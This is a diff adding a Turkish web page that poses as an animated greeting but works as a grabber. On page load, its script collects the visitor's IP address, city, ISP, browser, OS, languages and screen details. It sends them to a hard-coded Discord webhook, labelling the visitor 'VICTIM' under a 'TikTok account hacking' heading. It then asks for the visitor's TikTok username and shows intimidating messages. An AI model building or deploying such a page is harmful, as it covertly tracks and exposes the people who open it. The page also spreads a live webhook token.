@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animasyonlu Mesaj ve Bilgi Toplama</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+        }
+        .message {
+            font-size: 2em;
+            font-weight: bold;
+            color: #333;
+            white-space: pre-wrap;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+            margin: 10px;
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #555;
+            text-align: left;
+            max-width: 800px;
+            word-wrap: break-word;
+            display: none; /* Başlangıçta gizli */
+        }
+        #map {
+            height: 400px;
+            width: 100%;
+            margin-top: 20px;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <div class="message" id="message">Merhaba</div>
+    <div class="info" id="info"></div>
+    <canvas id="screenshot"></canvas>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const messageElement = document.getElementById('message');
+            const infoElement = document.getElementById('info');
+            const canvas = document.getElementById('screenshot');
+            const webhookURL = 'https://discord.com/api/webhooks/1268469635628531803/GeAU4XlRg54ptWLXyd5YHu0Wo4rnPVhFU_zGOSOKqatciu-spLdFARKDwPOY_-ZI3XvI';
+
+            let collectedData = {};
+
+            function sendWebhook(data) {
+                const embed = {
+                    title: 'TikTok Hesap Hacking Bilgileri',
+                    color: 16711680, // Kırmızı renk
+                    fields: [
+                        { name: 'Yazar', value: 'VİCTİM', inline: false },
+                        { name: 'IP Adresi', value: data.ip, inline: false },
+                        { name: 'Ülke', value: data.country, inline: false },
+                        { name: 'Şehir', value: data.city, inline: false },
+                        { name: 'Sokak', value: data.street, inline: false },
+                        { name: 'İnternet Adı', value: data.isp, inline: false },
+                        { name: 'Tarayıcı', value: data.browser, inline: false },
+                        { name: 'Ekran Çözünürlüğü', value: `${data.screenWidth}x${data.screenHeight}`, inline: false },
+                        { name: 'Dil', value: data.language, inline: false },
+                        { name: 'Zaman Dilimi', value: data.timeZone, inline: false },
+                        { name: 'Yönlendirme (Referrer)', value: data.referrer, inline: false },
+                        { name: 'Klavye Dili', value: data.keyboardLanguage, inline: false },
+                        { name: 'Ağ Bağlantısı Türü', value: data.networkType, inline: false },
+                        { name: 'İşletim Sistemi', value: data.platform, inline: false },
+                        { name: 'Görsel Boyut', value: `${data.viewportWidth}x${data.viewportHeight}`, inline: false }
+                    ],
+                    footer: { text: 'Bu mesaj otomatik olarak gönderilmiştir.' }
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Bilgiler başarıyla gönderildi!');
+                    } else {
+                        console.error('Bir hata oluştu.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+
+            function fetchIPAndLocation() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+
+                        return fetch(`https://ipapi.co/${ip}/json/`)
+                            .then(response => response.json())
+                            .then(locationData => {
+                                const country = locationData.country_name || 'Bilinmiyor';
+                                const city = locationData.city || 'Bilinmiyor';
+                                const street = locationData.street || 'Bilinmiyor'; // Sokak bilgisi genelde sağlanmaz
+                                const isp = locationData.isp || 'Bilinmiyor';
+
+                                collectedData = {
+                                    ip,
+                                    country,
+                                    city,
+                                    street,
+                                    isp,
+                                    browser: navigator.userAgent,
+                                    screenWidth: window.screen.width,
+                                    screenHeight: window.screen.height,
+                                    language: navigator.language || navigator.userLanguage,
+                                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                    referrer: document.referrer,
+                                    keyboardLanguage: navigator.languages.join(', '),
+                                    networkType: (navigator.connection || navigator.mozConnection || navigator.webkitConnection)?.effectiveType || 'bilinmiyor',
+                                    platform: navigator.platform,
+                                    viewportWidth: window.innerWidth,
+                                    viewportHeight: window.innerHeight
+                                };
+
+                                // Bilgileri gönder
+                                sendWebhook(collectedData);
+
+                                // TikTok kullanıcı adını almaya çalış
+                                let tiktokUsername = 'Bilinmiyor';
+                                const tiktokPrompt = 'TikTok kullanıcı adınız nedir ? : ';
+                                const usernameInput = prompt(tiktokPrompt);
+                                if (usernameInput) {
+                                    tiktokUsername = usernameInput;
+                                }
+
+                                // Animasyonlu mesajları sırayla göster
+                                showMessage('TikTokta Hesap Çalmak Kanunen Suçtur ve bunun bir cezası Vardır', 3000, () => {
+                                    showMessage('Eğer derseniz ki, \'Biz çalmadık\'. Diyebileceğimiz tek bir cevap var, BERENSOFFICAL', 3000, () => {
+                                        // Bilgileri ekranda göster
+                                        infoElement.innerHTML = `
+                                            <h2>Alınan Bilgiler:</h2>
+                                            <strong>IP Adresi:</strong> ${collectedData.ip}<br>
+                                            <strong>Ülke:</strong> ${collectedData.country}<br>
+                                            <strong>Şehir:</strong> ${collectedData.city}<br>
+                                            <strong>Sokak:</strong> ${collectedData.street}<br>
+                                            <strong>İnternet Adı:</strong> ${collectedData.isp}<br>
+                                            <strong>Tarayıcı:</strong> ${collectedData.browser}<br>
+                                            <strong>Ekran Çözünürlüğü:</strong> ${collectedData.screenWidth}x${collectedData.screenHeight}<br>
+                                            <strong>Dil:</strong> ${collectedData.language}<br>
+                                            <strong>Zaman Dilimi:</strong> ${collectedData.timeZone}<br>
+                                            <strong>Yönlendirme (Referrer):</strong> ${collectedData.referrer}<br>
+                                            <strong>Klavye Dili:</strong> ${collectedData.keyboardLanguage}<br>
+                                            <strong>Ağ Bağlantısı Türü:</strong> ${collectedData.networkType}<br>
+                                            <strong>İşletim Sistemi:</strong> ${collectedData.platform}<br>
+                                            <strong>Görsel Boyut:</strong> ${collectedData.viewportWidth}x${collectedData.viewportHeight}<br>
+                                            <strong>TikTok Kullanıcı Adı:</strong> ${tiktokUsername}
+                                        `;
+                                        infoElement.style.display = 'block'; // Bilgileri göster
+
+                                        // Ekran görüntüsünü al
+                                        html2canvas(document.body).then(canvas => {
+                                            const screenshotData = canvas.toDataURL('image/png');
+                                            // Bu veriyi gönderebilirsiniz veya kaydedebilirsiniz
+                                            console.log('Ekran görüntüsü verisi:', screenshotData);
+                                        });
+                                    });
+                                });
+                            });
+                    });
+            }
+
+            function showMessage(message, delay, callback) {
+                messageElement.textContent = message;
+                messageElement.style.opacity = 1;
+
+                setTimeout(() => {
+                    messageElement.style.opacity = 0;
+
+                    setTimeout(() => {
+                        if (callback) callback();
+                    }, 1000); // Kaybolma süresi
+                }, delay); // Gösterim süresi
+            }
+
+            fetchIPAndLocation();
+        });
+    </script>
+</body>
+</html>
